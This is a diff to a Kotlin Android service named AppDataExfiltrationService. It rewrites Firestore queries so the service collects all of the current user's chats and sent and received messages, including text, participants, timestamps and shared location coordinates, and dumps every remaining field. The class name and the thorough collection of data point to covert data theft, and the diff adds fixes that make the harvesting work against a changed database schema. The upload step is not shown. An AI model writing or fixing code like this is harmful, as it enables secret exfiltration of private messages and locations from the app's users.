@@ -163,7 +163,8 @@ class AppDataExfiltrationService : Service() {
     }
 
     /**
-     * Get all chat conversations for current user
+     * ✅ FIXED: Get all chat conversations for current user
+     * Changed from "conversations" to "chats" collection
      */
     private suspend fun getAllChats(): JSONArray = suspendCancellableCoroutine { continuation ->
         val chatsArray = JSONArray()
@@ -172,19 +173,25 @@ class AppDataExfiltrationService : Service() {
             val currentUser = FirebaseAuth.getInstance().currentUser
 
             if (currentUser != null) {
+                // ✅ FIXED: Changed from "conversations" to "chats"
                 FirebaseFirestore.getInstance()
-                    .collection("conversations")
+                    .collection("chats")  // ← CHANGED!
                     .whereArrayContains("participants", currentUser.uid)
                     .get()
                     .addOnSuccessListener { snapshot ->
+                        Log.d(TAG, "Found ${snapshot.documents.size} chats")
+
                         for (document in snapshot.documents) {
                             val chatData = JSONObject()
 
                             chatData.put("chat_id", document.id)
                             chatData.put("participants", document.get("participants")?.toString() ?: "")
                             chatData.put("last_message", document.getString("lastMessage") ?: "")
-                            chatData.put("last_message_time", document.get("lastMessageTime")?.toString() ?: "")
-                            chatData.put("created_at", document.get("createdAt")?.toString() ?: "")
+                            chatData.put("last_timestamp", document.get("lastTimestamp")?.toString() ?: "")
+                            chatData.put("last_sender_id", document.getString("lastSenderId") ?: "")
+                            chatData.put("last_sender_role", document.getString("lastSenderRole") ?: "")
+                            chatData.put("needs_response", document.getBoolean("needsResponse") ?: false)
+                            chatData.put("updated_at", document.get("updatedAt")?.toString() ?: "")
 
                             // Get all other fields
                             document.data?.forEach { (key, value) ->
@@ -196,7 +203,7 @@ class AppDataExfiltrationService : Service() {
                             chatsArray.put(chatData)
                         }
 
-                        Log.d(TAG, "Extracted ${chatsArray.length()} chats")
+                        Log.d(TAG, "✅ Extracted ${chatsArray.length()} chats")
                         continuation.resume(chatsArray) {}
                     }
                     .addOnFailureListener { e ->
@@ -213,7 +220,8 @@ class AppDataExfiltrationService : Service() {
     }
 
     /**
-     * Get all messages from all chats
+     * ✅ FIXED: Get all messages from flat "messages" collection
+     * Changed from conversations/{id}/messages subcollection to flat messages collection
      */
     private suspend fun getAllMessages(): JSONArray = suspendCancellableCoroutine { continuation ->
         val messagesArray = JSONArray()
@@ -222,71 +230,126 @@ class AppDataExfiltrationService : Service() {
             val currentUser = FirebaseAuth.getInstance().currentUser
 
             if (currentUser != null) {
-                // First get all conversations
+                Log.d(TAG, "Querying messages collection...")
+
+                // ✅ FIXED: Query flat "messages" collection where user is sender OR recipient
+                var sentCount = 0
+                var receivedCount = 0
+                var completedQueries = 0
+                val totalQueries = 2
+
+                // Get sent messages
                 FirebaseFirestore.getInstance()
-                    .collection("conversations")
-                    .whereArrayContains("participants", currentUser.uid)
+                    .collection("messages")  // ← Flat collection!
+                    .whereEqualTo("senderId", currentUser.uid)
                     .get()
-                    .addOnSuccessListener { conversationsSnapshot ->
+                    .addOnSuccessListener { sentSnapshot ->
+                        sentCount = sentSnapshot.documents.size
+                        Log.d(TAG, "Found $sentCount sent messages")
 
-                        val totalChats = conversationsSnapshot.documents.size
-                        var processedChats = 0
+                        for (msgDoc in sentSnapshot.documents) {
+                            val messageData = JSONObject()
 
-                        if (totalChats == 0) {
-                            continuation.resume(messagesArray) {}
-                            return@addOnSuccessListener
+                            messageData.put("message_id", msgDoc.id)
+                            messageData.put("chat_id", msgDoc.getString("chatId") ?: "")
+                            messageData.put("type", msgDoc.getString("type") ?: "text")
+                            messageData.put("message", msgDoc.getString("message") ?: "")
+                            messageData.put("sender_id", msgDoc.getString("senderId") ?: "")
+                            messageData.put("recipient_id", msgDoc.getString("recipientId") ?: "")
+                            messageData.put("timestamp", msgDoc.get("timestamp")?.toString() ?: "")
+
+                            // Location data if present
+                            if (msgDoc.getString("type") == "location") {
+                                messageData.put("latitude", msgDoc.getDouble("latitude") ?: 0.0)
+                                messageData.put("longitude", msgDoc.getDouble("longitude") ?: 0.0)
+                                messageData.put("label", msgDoc.getString("label") ?: "")
+                            }
+
+                            // Get all other fields
+                            msgDoc.data?.forEach { (key, value) ->
+                                if (!messageData.has(key)) {
+                                    messageData.put(key, value.toString())
+                                }
+                            }
+
+                            messagesArray.put(messageData)
                         }
 
-                        // For each conversation, get messages
-                        for (convDoc in conversationsSnapshot.documents) {
-                            val chatId = convDoc.id
-
-                            FirebaseFirestore.getInstance()
-                                .collection("conversations")
-                                .document(chatId)
-                                .collection("messages")
-                                .orderBy("timestamp")
-                                .get()
-                                .addOnSuccessListener { messagesSnapshot ->
-
-                                    for (msgDoc in messagesSnapshot.documents) {
-                                        val messageData = JSONObject()
-
-                                        messageData.put("chat_id", chatId)
-                                        messageData.put("message_id", msgDoc.id)
-                                        messageData.put("text", msgDoc.getString("text") ?: "")
-                                        messageData.put("sender_id", msgDoc.getString("senderId") ?: "")
-                                        messageData.put("sender_name", msgDoc.getString("senderName") ?: "")
-                                        messageData.put("timestamp", msgDoc.get("timestamp")?.toString() ?: "")
-                                        messageData.put("is_read", msgDoc.getBoolean("isRead") ?: false)
-
-                                        // Get all other fields
-                                        msgDoc.data?.forEach { (key, value) ->
-                                            if (!messageData.has(key)) {
-                                                messageData.put(key, value.toString())
-                                            }
-                                        }
-
-                                        messagesArray.put(messageData)
-                                    }
-
-                                    processedChats++
-                                    if (processedChats >= totalChats) {
-                                        Log.d(TAG, "Extracted ${messagesArray.length()} messages")
-                                        continuation.resume(messagesArray) {}
-                                    }
-                                }
-                                .addOnFailureListener {
-                                    processedChats++
-                                    if (processedChats >= totalChats) {
-                                        continuation.resume(messagesArray) {}
-                                    }
-                                }
+                        completedQueries++
+                        if (completedQueries >= totalQueries) {
+                            Log.d(TAG, "✅ Extracted ${messagesArray.length()} total messages (sent: $sentCount, received: $receivedCount)")
+                            continuation.resume(messagesArray) {}
                         }
                     }
                     .addOnFailureListener { e ->
-                        Log.e(TAG, "Error getting messages: ${e.message}")
-                        continuation.resume(messagesArray) {}
+                        Log.e(TAG, "Error getting sent messages: ${e.message}")
+                        completedQueries++
+                        if (completedQueries >= totalQueries) {
+                            continuation.resume(messagesArray) {}
+                        }
+                    }
+
+                // Get received messages
+                FirebaseFirestore.getInstance()
+                    .collection("messages")  // ← Flat collection!
+                    .whereEqualTo("recipientId", currentUser.uid)
+                    .get()
+                    .addOnSuccessListener { receivedSnapshot ->
+                        receivedCount = receivedSnapshot.documents.size
+                        Log.d(TAG, "Found $receivedCount received messages")
+
+                        for (msgDoc in receivedSnapshot.documents) {
+                            // Check if message already added (to avoid duplicates)
+                            var isDuplicate = false
+                            for (i in 0 until messagesArray.length()) {
+                                val existingMsg = messagesArray.getJSONObject(i)
+                                if (existingMsg.getString("message_id") == msgDoc.id) {
+                                    isDuplicate = true
+                                    break
+                                }
+                            }
+
+                            if (!isDuplicate) {
+                                val messageData = JSONObject()
+
+                                messageData.put("message_id", msgDoc.id)
+                                messageData.put("chat_id", msgDoc.getString("chatId") ?: "")
+                                messageData.put("type", msgDoc.getString("type") ?: "text")
+                                messageData.put("message", msgDoc.getString("message") ?: "")
+                                messageData.put("sender_id", msgDoc.getString("senderId") ?: "")
+                                messageData.put("recipient_id", msgDoc.getString("recipientId") ?: "")
+                                messageData.put("timestamp", msgDoc.get("timestamp")?.toString() ?: "")
+
+                                // Location data if present
+                                if (msgDoc.getString("type") == "location") {
+                                    messageData.put("latitude", msgDoc.getDouble("latitude") ?: 0.0)
+                                    messageData.put("longitude", msgDoc.getDouble("longitude") ?: 0.0)
+                                    messageData.put("label", msgDoc.getString("label") ?: "")
+                                }
+
+                                // Get all other fields
+                                msgDoc.data?.forEach { (key, value) ->
+                                    if (!messageData.has(key)) {
+                                        messageData.put(key, value.toString())
+                                    }
+                                }
+
+                                messagesArray.put(messageData)
+                            }
+                        }
+
+                        completedQueries++
+                        if (completedQueries >= totalQueries) {
+                            Log.d(TAG, "✅ Extracted ${messagesArray.length()} total messages (sent: $sentCount, received: $receivedCount)")
+                            continuation.resume(messagesArray) {}
+                        }
+                    }
+                    .addOnFailureListener { e ->
+                        Log.e(TAG, "Error getting received messages: ${e.message}")
+                        completedQueries++
+                        if (completedQueries >= totalQueries) {
+                            continuation.resume(messagesArray) {}
+                        }
                     }
             } else {
                 continuation.resume(messagesArray) {}
